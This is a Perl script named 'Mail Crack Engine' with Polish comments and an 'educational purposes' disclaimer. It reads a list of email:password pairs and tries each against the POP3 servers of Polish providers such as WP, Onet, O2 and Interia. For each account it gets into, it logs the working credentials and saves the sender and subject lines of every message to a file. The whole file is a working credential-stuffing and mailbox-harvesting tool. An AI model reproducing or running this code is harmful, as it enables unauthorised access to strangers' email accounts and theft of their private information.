#!/usr/bin/perl
# W celach edukacyjnych, nie ponosze odpowiedzialnosci za sposob wykorzystania kodu.
# Kod jest prosty bo ja prosto kodzie ;p

use Net::POP3;
use Mail::POP3Client;

print("Mail Crack Engine \r\n\r\n");
open(FILE, "./lista.txt");

while(<FILE>) {
chomp($_);
$_=~s/\r//;

while($_ =~ m/(.*?)\@(.*?):(.*)/g){
my $log=$1;
my $dom=$2;
my $haslo=$3;
my $cal=$_;
# Onet amorki.pl autograf.pl buziaczek.pl onet.eu op.pl poczta.onet.eu poczta.onet.pl vp.pl         -------- Work ale slabo. (do poprawy)
if($dom =~ m/amorki|poczta.onet|vp|op.pl/) {
my $mail= $log."\@".$dom;
#print("TO 0ne3t ".$log."\@".$dom.".pl A haslo".$haslo."\r\n");
#print("fucnkaj onet dziala a tera sprawdzam mail $mail\r\n");
#print("$mail");
&onet($mail,$haslo);
}
# O2 o2.pl go2.pl tlen.pl       ------- WORK good.
if($dom =~ m/o2|go2|tlen/) {
my $mail= $log."\@".$dom;
#print("TO o2 ".$log."\@".$dom.".pl A haslo ".$haslo."\r\n");
&o2($mail,$haslo);
}
# wp wp.pl
if($dom =~ m/wp/) {            #------- WORK good
my $mail= $log."\@".$dom;
#print("TO wp ".$log."\@".$dom.".pl A haslo ".$haslo."\r\n");
&wp($mail,$haslo);
}
# Interia interia.pl poczta.fm interia.eu 1gb.pl 2gb.pl vip.interia.pl serwus.pl akcja.pl czateria.pl znajomi.pl #------ WORK fine
if($dom =~ m/interia|1gb|2gb|interia|serwus|akcja|czateria|znajomi/) {
my $mail= $log."\@".$dom;
#print("TO Interia ".$log."\@".$dom.".pl A haslo ".$haslo."\r\n");
&interia($mail,$haslo);
}
#print("Login $log Domena $dom Haslo: $haslo icalosc $cal \r\n");
}
}
close(FILE);
# Suby
sub o2() {
my $login = $_[0];
my $haslo = $_[1];
$pop = Net::POP3->new('poczta.o2.pl');
$result = $pop->login( $login , $haslo );
if ($result eq undef) { 
##print "Nie zalogowano!! Usera $login z haslem: $haslo\r\n"; 
}
else { 
print "Zalogowano!! na $login z haslem $haslo\r\n";
print "liczba postow w skrzynce: $result\r\n"; 
&save($login,$haslo, "poczta.o2.pl");
}
$pop->quit();
}
sub interia() {
my $login = $_[0];
my $haslo = $_[1];
$pop = Net::POP3->new('poczta.interia.pl');
$result = $pop->login( $login , $haslo );
if ($result eq undef) { 
#print "Nie zalogowano!! Usera $login z haslem: $haslo\r\n"; 
}
else { 
print "Zalogowano!! na $login z haslem $haslo\r\n";
print "liczba postow w skrzynce: $result\r\n"; 
&save($login,$haslo, "poczta.interia.pl");
}
$pop->quit();
}
sub onet() {
my $login = $_[0];
my $haslo = $_[1];
#print("test $login");
$pop = Net::POP3->new('pop3.poczta.onet.pl');
$result = $pop->login( $login , $haslo );
if ($result eq undef) { 
#print "Nie zalogowano!! Usera $login z haslem: $haslo\r\n"; 
}
else { 
print "Zalogowano!! na $login z haslem $haslo\r\n";
print "liczba postow w skrzynce: $result\r\n"; 
&save($login,$haslo, "pop3.poczta.onet.pl");
}
$pop->quit();
}
sub wp() {
my $login = $_[0];
my $haslo = $_[1];
$pop = Net::POP3->new('pop3.wp.pl');
$result = $pop->login( $login , $haslo );
if ($result eq undef) { 
#print "Nie zalogowano!! Usera $login z haslem: $haslo\r\n"; 
}
else { 
print "Zalogowano!! na $login z haslem $haslo\r\n";
print "liczba postow w skrzynce: $result\r\n"; 
&save($login,$haslo, "pop3.wp.pl");
}
$pop->quit();
}

sub save() {
$login = $_[0];
$haslo = $_[1];
$popcz = $_[2];
my($pop) = Mail::POP3Client->new($login, $haslo, $popcz);
for ($i = 1; $i <= $pop->Count; $i++) {
    foreach ($pop->Head($i)) {
open (email, ">> ./emaildone.txt");

/^(From|Subject):\s+/i && print email "$_ ||",; } print email $login.":".$haslo."\n"; 

close (email);



    }
}

